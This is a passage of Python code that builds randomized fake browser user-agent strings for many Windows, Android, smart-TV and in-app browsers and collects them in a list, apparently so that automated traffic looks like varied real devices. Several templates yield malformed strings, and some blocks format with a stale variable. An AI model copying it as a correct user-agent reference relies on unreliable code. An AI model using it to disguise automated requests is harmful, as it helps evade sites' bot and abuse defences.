    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='like Gecko'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    #Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/108.0.1462.76
    aa='Mozilla/5.0 (Windows NT 10.0; Win64; x64;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Windows NT 10.0; Win64; x64'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/109.0.0.0 Safari/537.36 Edg/108.0.1462.76'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    #Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Vivaldi/5.6.2867.50
    
    aa='Mozilla/5.0 (Windows NT 10.0; Win64; x64;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Windows NT 10.0; Win64; x64'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/109.0.0.0 Safari/537.36 Vivaldi/5.6.2867.50'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    #Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
    
    
    aa='Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Windows NT 10.0; Win64; x64; rv:108.0'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Gecko/20100101 Firefox/108.0'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    
    #Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36
    
    aa='Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Linux; Android 6.0.1; SM-G532G Build/MMB29T'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/63.0.3239.83 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    #Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36
    
    aa='Mozilla/5.0 (Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G991B;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Linux; Android 12; SAMSUNG SM-G991B'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    #Mozilla/5.0 (SMART-TV; Linux; Tizen 2.4.0) AppleWebkit/538.1 (KHTML, like Gecko) SamsungBrowser/1.1 tv Safari/538.1
    aa='Mozilla/5.0 (SMART-TV; Linux; Tizen 2.4.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['SMART-TV; Linux; Tizen 2.4.0'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='SamsungBrowser/1.1 tv Safari/538.1'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
   
   #Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/E7FBAF
   
    aa='Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900P Build/LRX21T;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Linux; Android 5.0; SAMSUNG SM-G900P Build/LRX21T'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/E7FBAF'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
   
   #Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SCH-I545 4G Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/E7FBAF
   
    aa='Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SCH-I545 4G Build/LRX22C;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Linux; Android 5.0.1; SAMSUNG SCH-I545 4G Build/LRX22C'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/E7FBAF'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
   #Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900P Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/E7FBAF
   
    aa='Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900P Build/LRX21V;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Linux; Android 5.0; SAMSUNG SM-N900P Build/LRX21V'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/E7FBAF'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
   
   #Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36
    aa='Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A515F;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Linux; Android 11; SAMSUNG SM-A515F'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
   
   #Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/E7FBAF
    aa='Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/E7FBAF'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
   
   #NEW#AGENT
    aa='Mozilla/5.0 (Linux; Android 10;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='RMX2185 Build/'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l=' 4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 '
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    aa='Mozilla/5.0 (SMART-TV;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='Linux; Tizen 2.4.0)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebkit/538.1 (KHTML, like Gecko) SamsungBrowser/1.1 tv'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Safari/538.1'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; U; Android 10; '
    b=random.choice(['6','7','8','9','10','11','12'])
    c='Aquaris X2 Build/'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=' QKQ1.200216.002) AppleWebKit/537.36 (KHTML, like Gecko) Versi/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9 .3'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android 9;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='Lenovo TB-X605L Build/'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='PKQ1.190319.001 ) AppleWebKit/537.36 (KHTML, seperti Gecko) JioBrowser/1.4.7 Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='74.0.3729.136 Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    #
    
    aa='Mozilla/5.0 (Linux; U; Android 5.1.1; zh-cn;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['vivo Xplay5A Build/LMY47V)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/534.30 (KHTML, seperti Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Versi/4.0 UCBrowser/1.0.0.100 U3/0.8.0 Mobile Safari/534.30'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['SAMSUNG SM-F900U Build/PPR1.180610.011'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    aa='Mozilla/5.0 (Windows NT 10.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Win64; x64'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/108.0.0.0 Safari/537.36 Vivaldi/5.5.2805.50'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['SAMSUNG GT-I9506/XXUDOE4 Build/LRX22C'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/56.0.2924.87'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android 11;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 9 Pro)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/105.0.5195.19 Mobile Safari/537.36 TwitterAndroid'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['en-US; vivo 1807 Build/OPM1.171019.026'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android 12;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['V2149 Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Version/4.0 Chrome/103.0.5060.53 Mobile Safari/537.36uc mini browser3.0'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    a='Mozilla/5.0 (Linux; Android 11;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Infinix X6811 Build/RP1A.200720.011; wv'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/391.1.0.37.104;]'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android 12;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['2201116PG'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android 10;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['RMX2185 Build/QP1A.190711.020; wv)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android 12;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['SHARK KTUS-H0'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
